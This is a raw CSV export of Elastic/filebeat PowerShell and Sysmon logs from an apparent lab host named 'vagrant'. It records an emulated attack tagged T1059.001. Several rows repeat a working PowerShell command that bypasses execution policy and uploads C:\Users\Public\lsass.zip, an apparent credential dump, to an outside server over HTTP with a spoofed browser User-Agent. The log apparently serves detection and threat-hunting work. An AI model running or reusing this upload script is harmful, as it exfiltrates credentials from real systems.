ParameterBinding(Add-Type): name=""AssemblyName""; value=""System.Net.Http""",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,"""AssemblyName""","Add-Type, Add-Type","CommandInvocation, ParameterBinding","""Add-Type"", ""System.Net.Http""",-,-,"$ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",-,-,5.1.17763.1852,-,-,-,4,5.1.17763.1852,-,-,bde48661-68d6-4497-8031-ceecb4afd9c6,1,1,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,vagrant,-,-,-,-,VAGRANT,-,vagrant,-,wineventlog,Windows PowerShell,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,800,Classic,-,-,-,-,PowerShell,1551,Pipeline Execution Details,-,-,-,-,-
"Oct 21, 2022 @ 03:08:25.497",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell_operational,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Execute a Remote Command,verified,process,4104,"Oct 21, 2022 @ 03:08:27.012",windows.powershell_operational,"Oct 21, 2022 @ 03:08:50.000",event,windows,Microsoft-Windows-PowerShell,-,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,warning,-,-,-,-,"Creating Scriptblock text (1 of 1):
$ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 

ScriptBlock ID: f6d8596e-d9d8-41a0-8970-257cebb94585
Path: ",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,f6d8596e-d9d8-41a0-8970-257cebb94585,"$ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",-,-,-,-,-,-,1,1,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,S-1-5-21-31245427-1393067093-28759700-1000,-,{854ef8cf-e546-0001-c824-4f8546e5d801},wineventlog,Microsoft-Windows-PowerShell/Operational,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,4104,-,On create calls,"7,036","7,212",{a0c1853b-5c40-4b15-8766-3cf1c58f985a},Microsoft-Windows-PowerShell,836,Execute a Remote Command,VAGRANT,S-1-5-21-31245427-1393067093-28759700-1000,vagrant,User,1
"Oct 21, 2022 @ 03:08:25.134",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.sysmon_operational,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Process Create (rule: ProcessCreate),verified,process,1,"Oct 21, 2022 @ 03:08:27.002",windows.sysmon_operational,"Oct 21, 2022 @ 03:08:50.000",event,windows,Microsoft-Windows-Sysmon,-,start,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2022-10-21 07:08:25.134
ProcessGuid: {7a53022b-4569-6352-c601-000000000b00}
ProcessId: 5700
Image: C:\Program Files\Git\cmd\git.exe
FileVersion: -
Description: Git for Windows
Product: Git
Company: The Git Development Community
OriginalFileName: git.exe
CommandLine: ""C:\Program Files\Git\cmd\git.exe"" help -a
CurrentDirectory: C:\Users\vagrant\Downloads\elastic-agent-7.17.6-windows-x86_64\
User: VAGRANT\vagrant
LogonGuid: {7a53022b-2aa0-6352-661a-050000000000}
LogonId: 0x51A66
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=621E3677D88C56BD0797A48D6BEAE682B8255027,MD5=602F5931006B9AA2BDD04D43CFC3EC39,SHA256=6C4DBB77D05CA5C482CE3782255F56BB904445809F1DF3B655E2505EAC7FA0B2,IMPHASH=B5C28AB8B10670F75EB53AFFC23558E6
ParentProcessGuid: {7a53022b-4566-6352-c301-000000000b00}
ParentProcessId: 7036
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$ErrorActionPreference = 'Stop'; $fieldName = \""lsass.zip\""; $filePath = \""C:\Users\Public\lsass.zip\""; $url = \""http://192.168.33.12:8888/file/upload\"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(\""X-Request-Id\"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(\""User-Agent\"",\""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ""
ParentUser: VAGRANT\vagrant",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,"C:\Program Files\Git\cmd\git.exe, help, -a",3,"""C:\Program Files\Git\cmd\git.exe"" help -a",{7a53022b-4569-6352-c601-000000000b00},C:\Program Files\Git\cmd\git.exe,602f5931006b9aa2bdd04d43cfc3ec39,621e3677d88c56bd0797a48d6beae682b8255027,6c4dbb77d05ca5c482ce3782255f56bb904445809f1df3b655e2505eac7fa0b2,git.exe,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",5,"powershell.exe -ExecutionPolicy Bypass -C ""$ErrorActionPreference = 'Stop'; $fieldName = \""lsass.zip\""; $filePath = \""C:\Users\Public\lsass.zip\""; $url = \""http://192.168.33.12:8888/file/upload\"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(\""X-Request-Id\"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(\""User-Agent\"",\""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); """,{7a53022b-4566-6352-c301-000000000b00},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,"7,036",The Git Development Community,Git for Windows,-,b5c28ab8b10670f75eb53affc23558e6,git.exe,Git,"5,700",-,-,C:\Users\vagrant\Downloads\elastic-agent-7.17.6-windows-x86_64\,-,-,-,-,-,-,"6c4dbb77d05ca5c482ce3782255f56bb904445809f1df3b655e2505eac7fa0b2, 621e3677d88c56bd0797a48d6beae682b8255027, 602f5931006b9aa2bdd04d43cfc3ec39, b5c28ab8b10670f75eb53affc23558e6",vagrant,"technique_id=T1059.001,technique_name=PowerShell",-,-,-,VAGRANT,S-1-5-18,vagrant,-,wineventlog,Microsoft-Windows-Sysmon/Operational,vagrant,-,The Git Development Community,-,Git for Windows,-,-,-,High,{7a53022b-2aa0-6352-661a-050000000000},0x51a66,VAGRANT\vagrant,Git,-,-,-,-,-,-,-,-,1,1,-,Info,"2,716","3,916",{5770385f-c22a-43e0-bf4c-06f5698ffbd9},Microsoft-Windows-Sysmon,6528,Process Create (rule: ProcessCreate),NT AUTHORITY,S-1-5-18,SYSTEM,User,5
"Oct 21, 2022 @ 03:08:23.950",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.sysmon_operational,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Process Create (rule: ProcessCreate),verified,process,1,"Oct 21, 2022 @ 03:08:25.601",windows.sysmon_operational,"Oct 21, 2022 @ 03:08:49.000",event,windows,Microsoft-Windows-Sysmon,-,start,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2022-10-21 07:08:23.950
ProcessGuid: {7a53022b-4567-6352-c401-000000000b00}
ProcessId: 6464
Image: C:\Program Files\Git\cmd\git.exe
FileVersion: -
Description: Git for Windows
Product: Git
Company: The Git Development Community
OriginalFileName: git.exe
CommandLine: ""C:\Program Files\Git\cmd\git.exe"" --version
CurrentDirectory: C:\Users\vagrant\Downloads\elastic-agent-7.17.6-windows-x86_64\
User: VAGRANT\vagrant
LogonGuid: {7a53022b-2aa0-6352-661a-050000000000}
LogonId: 0x51A66
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=621E3677D88C56BD0797A48D6BEAE682B8255027,MD5=602F5931006B9AA2BDD04D43CFC3EC39,SHA256=6C4DBB77D05CA5C482CE3782255F56BB904445809F1DF3B655E2505EAC7FA0B2,IMPHASH=B5C28AB8B10670F75EB53AFFC23558E6
ParentProcessGuid: {7a53022b-4566-6352-c301-000000000b00}
ParentProcessId: 7036
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$ErrorActionPreference = 'Stop'; $fieldName = \""lsass.zip\""; $filePath = \""C:\Users\Public\lsass.zip\""; $url = \""http://192.168.33.12:8888/file/upload\"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(\""X-Request-Id\"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(\""User-Agent\"",\""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ""
